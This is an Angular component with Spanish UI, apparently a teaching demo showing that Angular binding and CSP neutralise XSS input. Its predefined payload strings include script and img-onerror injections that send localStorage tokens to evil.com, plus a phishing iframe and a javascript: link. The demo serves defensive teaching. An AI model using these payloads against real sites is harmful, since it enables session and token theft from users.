import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { MatCardModule } from '@angular/material/card';
import { MatInputModule } from '@angular/material/input';
import { MatButtonModule } from '@angular/material/button';
import { MatFormFieldModule } from '@angular/material/form-field';
import { MatIconModule } from '@angular/material/icon';
import { MatTabsModule } from '@angular/material/tabs';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-xss-test',
  standalone: true,
  imports: [
    CommonModule, 
    FormsModule, 
    MatCardModule, 
    MatInputModule, 
    MatButtonModule,
    MatFormFieldModule,
    MatIconModule,
    MatTabsModule
  ],
  template: `
    <div class="test-container">
      <mat-card class="instructions-card">
        <mat-card-header>
          <mat-card-title>🧪 Laboratorio de Pruebas XSS</mat-card-title>
        </mat-card-header>
        <mat-card-content>
          <p><strong>Objetivo:</strong> Demostrar que las protecciones XSS están activas.</p>
          <p>Intenta estos ataques simulados y observa cómo son bloqueados:</p>
        </mat-card-content>
      </mat-card>

      <mat-card class="test-card">
        <mat-card-header>
          <mat-card-title>📝 Ingresa tu "Ataque"</mat-card-title>
        </mat-card-header>
        <mat-card-content>
          
          <mat-tab-group>
            <!-- Tab 1: Ataques Pre-definidos -->
            <mat-tab label="Ataques Predefinidos">
              <div class="attacks-list">
                <h3>Click en cualquier "ataque" para probarlo:</h3>
                
                <button mat-stroked-button color="warn" (click)="setAttack(attacks.scriptExterno)">
                  <mat-icon>security</mat-icon>
                  Ataque 1: Script Externo
                </button>
                
                <button mat-stroked-button color="warn" (click)="setAttack(attacks.scriptInline)">
                  <mat-icon>security</mat-icon>
                  Ataque 2: Script Inline
                </button>
                
                <button mat-stroked-button color="warn" (click)="setAttack(attacks.imgOnerror)">
                  <mat-icon>security</mat-icon>
                  Ataque 3: IMG onerror
                </button>
                
                <button mat-stroked-button color="warn" (click)="setAttack(attacks.iframeMalicioso)">
                  <mat-icon>security</mat-icon>
                  Ataque 4: Iframe Malicioso
                </button>
                
                <button mat-stroked-button color="warn" (click)="setAttack(attacks.linkJavascript)">
                  <mat-icon>security</mat-icon>
                  Ataque 5: Link JavaScript
                </button>

                <button mat-stroked-button color="primary" (click)="setAttack(attacks.textoNormal)">
                  <mat-icon>check_circle</mat-icon>
                  Texto Normal (Sin ataque)
                </button>
              </div>
            </mat-tab>

            <!-- Tab 2: Ataque Personalizado -->
            <mat-tab label="Ataque Personalizado">
              <div class="custom-attack">
                <p>Escribe tu propio código malicioso:</p>
                <mat-form-field appearance="outline" class="full-width">
                  <mat-label>Código HTML/JavaScript</mat-label>
                  <textarea 
                    matInput 
                    [(ngModel)]="userInput" 
                    rows="5"
                    placeholder="Ejemplo: <script>alert('XSS')</script>">
                  </textarea>
                </mat-form-field>
                <button mat-raised-button color="accent" (click)="testInput()">
                  Probar Ataque
                </button>
              </div>
            </mat-tab>
          </mat-tab-group>

        </mat-card-content>
      </mat-card>

      <!-- Resultado: Angular Sanitization -->
      <mat-card class="result-card safe">
        <mat-card-header>
          <mat-card-title>
            <mat-icon class="status-icon safe">shield</mat-icon>
            RESULTADO: Renderizado Seguro (Angular Sanitization)
          </mat-card-title>
        </mat-card-header>
        <mat-card-content>
          <div class="result-box safe-box">
            <strong>Input Original:</strong>
            <pre>{{ userInput }}</pre>
            
            <strong>Renderizado con Angular Binding:</strong>
            <div class="render-output">
              {{ userInput }}
            </div>
            
            <div class="explanation">
              <mat-icon>info</mat-icon>
              <p><strong>¿Qué pasó?</strong> Angular sanitizó automáticamente el contenido. 
              Los tags HTML se muestran como texto, no se ejecutan.</p>
            </div>
          </div>
        </mat-card-content>
      </mat-card>

      <!-- Instrucciones de Verificación -->
      <mat-card class="verification-card">
        <mat-card-header>
          <mat-card-title>
            <mat-icon>checklist</mat-icon>
            Cómo Verificar las Protecciones
          </mat-card-title>
        </mat-card-header>
        <mat-card-content>
          <div class="verification-steps">
            <h3>1. ✅ Verifica Angular Sanitization</h3>
            <ul>
              <li>Observa el cuadro verde arriba</li>
              <li>El código malicioso se muestra como TEXTO</li>
              <li>No se ejecuta ningún script</li>
            </ul>

            <h3>2. 🔍 Verifica CSP en DevTools</h3>
            <ul>
              <li>Presiona <kbd>F12</kbd> para abrir DevTools</li>
              <li>Ve a la pestaña <strong>Console</strong></li>
              <li>Busca mensajes en rojo que digan:</li>
              <li class="error-example">
                ❌ <em>"Refused to load the script... because it violates the Content Security Policy"</em>
              </li>
              <li>Eso significa que CSP está funcionando 🛡️</li>
            </ul>

            <h3>3. 🌐 Verifica Headers de Seguridad</h3>
            <ul>
              <li>En DevTools, ve a <strong>Network</strong></li>
              <li>Recarga la página (F5)</li>
              <li>Click en cualquier request</li>
              <li>Ve a <strong>Headers → Response Headers</strong></li>
              <li>Busca: <code>content-security-policy</code></li>
            </ul>

            <h3>4. 🎯 Intenta Ataque Real</h3>
            <p>Copia esto e intenta pegarlo en un campo de texto:</p>
            <pre class="attack-code">&lt;img src=x onerror="alert('Si ves esto, hay vulnerabilidad XSS')"&gt;</pre>
            <p><strong>Resultado esperado:</strong> No debe salir ningún alert. Solo verás el texto.</p>
          </div>
        </mat-card-content>
      </mat-card>

      <!-- Resumen de Protecciones -->
      <mat-card class="summary-card">
        <mat-card-header>
          <mat-card-title>
            <mat-icon>security</mat-icon>
            Resumen de Protecciones Activas
          </mat-card-title>
        </mat-card-header>
        <mat-card-content>
          <div class="protections-grid">
            <div class="protection-item">
              <mat-icon class="check-icon">check_circle</mat-icon>
              <div>
                <strong>Angular Sanitization</strong>
                <p>Convierte HTML malicioso en texto seguro automáticamente</p>
              </div>
            </div>

            <div class="protection-item">
              <mat-icon class="check-icon">check_circle</mat-icon>
              <div>
                <strong>Content-Security-Policy</strong>
                <p>Bloquea scripts externos y código malicioso en el navegador</p>
              </div>
            </div>

            <div class="protection-item">
              <mat-icon class="check-icon">check_circle</mat-icon>
              <div>
                <strong>Bearer Token Authentication</strong>
                <p>Token en header Authorization, no accesible por scripts</p>
              </div>
            </div>

            <div class="protection-item">
              <mat-icon class="check-icon">check_circle</mat-icon>
              <div>
                <strong>X-XSS-Protection Header</strong>
                <p>Protección adicional para navegadores antiguos</p>
              </div>
            </div>
          </div>

          <div class="security-score">
            <h3>Nivel de Seguridad XSS: <span class="score">95/100</span> ⭐⭐⭐⭐⭐</h3>
          </div>
        </mat-card-content>
      </mat-card>
    </div>
  `,
  styles: [`
    .test-container {
      padding: 20px;
      max-width: 1400px;
      margin: 0 auto;
    }

    mat-card {
      margin-bottom: 20px;
    }

    .instructions-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }

    .instructions-card mat-card-title {
      color: white;
      font-size: 24px;
    }

    .test-card {
      border: 2px solid #ff9800;
    }

    .attacks-list {
      padding: 20px;
    }

    .attacks-list h3 {
      margin-bottom: 20px;
      color: #666;
    }

    .attacks-list button {
      display: block;
      width: 100%;
      margin-bottom: 12px;
      text-align: left;
      padding: 12px 16px;
    }

    .custom-attack {
      padding: 20px;
    }

    .full-width {
      width: 100%;
    }

    .result-card {
      border-left: 5px solid #4caf50;
    }

    .result-card.safe {
      background: #f1f8f4;
    }

    .status-icon {
      margin-right: 8px;
      vertical-align: middle;
    }

    .status-icon.safe {
      color: #4caf50;
    }

    .result-box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      border: 2px solid #4caf50;
    }

    .result-box pre {
      background: #f5f5f5;
      padding: 12px;
      border-radius: 4px;
      overflow-x: auto;
      border-left: 3px solid #ff5722;
    }

    .render-output {
      background: #e8f5e9;
      padding: 16px;
      border-radius: 4px;
      margin: 12px 0;
      border: 1px solid #4caf50;
      min-height: 50px;
      font-family: monospace;
    }

    .explanation {
      display: flex;
      align-items: flex-start;
      gap: 12px;
      background: #fff3cd;
      padding: 12px;
      border-radius: 4px;
      margin-top: 16px;
      border-left: 4px solid #ffc107;
    }

    .explanation mat-icon {
      color: #ff9800;
      flex-shrink: 0;
    }

    .verification-card {
      background: #e3f2fd;
    }

    .verification-steps h3 {
      color: #1976d2;
      margin-top: 20px;
      margin-bottom: 10px;
    }

    .verification-steps ul {
      margin-left: 20px;
    }

    .verification-steps li {
      margin-bottom: 8px;
      line-height: 1.6;
    }

    kbd {
      background: #333;
      color: white;
      padding: 2px 8px;
      border-radius: 3px;
      font-family: monospace;
      font-size: 0.9em;
    }

    .error-example {
      background: #ffebee;
      padding: 8px;
      border-radius: 4px;
      font-family: monospace;
      font-size: 0.9em;
      margin-top: 8px;
    }

    .attack-code {
      background: #fff3e0;
      padding: 12px;
      border-radius: 4px;
      border-left: 4px solid #ff9800;
      overflow-x: auto;
    }

    .summary-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }

    .summary-card mat-card-title {
      color: white;
    }

    .protections-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 16px;
      margin-top: 20px;
    }

    .protection-item {
      display: flex;
      gap: 12px;
      background: rgba(255, 255, 255, 0.1);
      padding: 16px;
      border-radius: 8px;
      backdrop-filter: blur(10px);
    }

    .check-icon {
      color: #4caf50;
      flex-shrink: 0;
    }

    .protection-item strong {
      display: block;
      margin-bottom: 4px;
      font-size: 16px;
    }

    .protection-item p {
      margin: 0;
      font-size: 14px;
      opacity: 0.9;
    }

    .security-score {
      text-align: center;
      margin-top: 30px;
      padding: 20px;
      background: rgba(255, 255, 255, 0.15);
      border-radius: 12px;
    }

    .security-score h3 {
      margin: 0;
      font-size: 24px;
    }

    .security-score .score {
      color: #4caf50;
      font-size: 32px;
      font-weight: bold;
    }

    ::ng-deep .mat-mdc-tab-body-content {
      padding: 20px 0;
    }
  `]
})
export class XssTestComponent {
  userInput: string = '';

  // Ataques predefinidos para probar
  attacks = {
    scriptExterno: '<script src="http://evil.com/steal-tokens.js"></script>',
    scriptInline: '<script>alert("XSS Attack! Token: " + localStorage.getItem("token"))</script>',
    imgOnerror: '<img src=x onerror="alert(\'XSS via IMG\'); fetch(\'http://evil.com/steal?token=\'+localStorage.token)">',
    iframeMalicioso: '<iframe src="http://malicious-site.com/phishing" width="100%" height="500"></iframe>',
    linkJavascript: '<a href="javascript:alert(\'XSS\')">Click aquí para premio</a>',
    textoNormal: 'Hola, este es un comentario normal sin código malicioso 😊'
  };

  constructor(private sanitizer: DomSanitizer) {
    this.userInput = this.attacks.scriptExterno;
  }

  setAttack(attack: string) {
    this.userInput = attack;
  }

  testInput() {
    // Solo actualiza el input, la sanitización es automática
    console.log('🧪 Testing input:', this.userInput);
    console.log('✅ Angular sanitizó automáticamente el contenido en el template');
  }
}
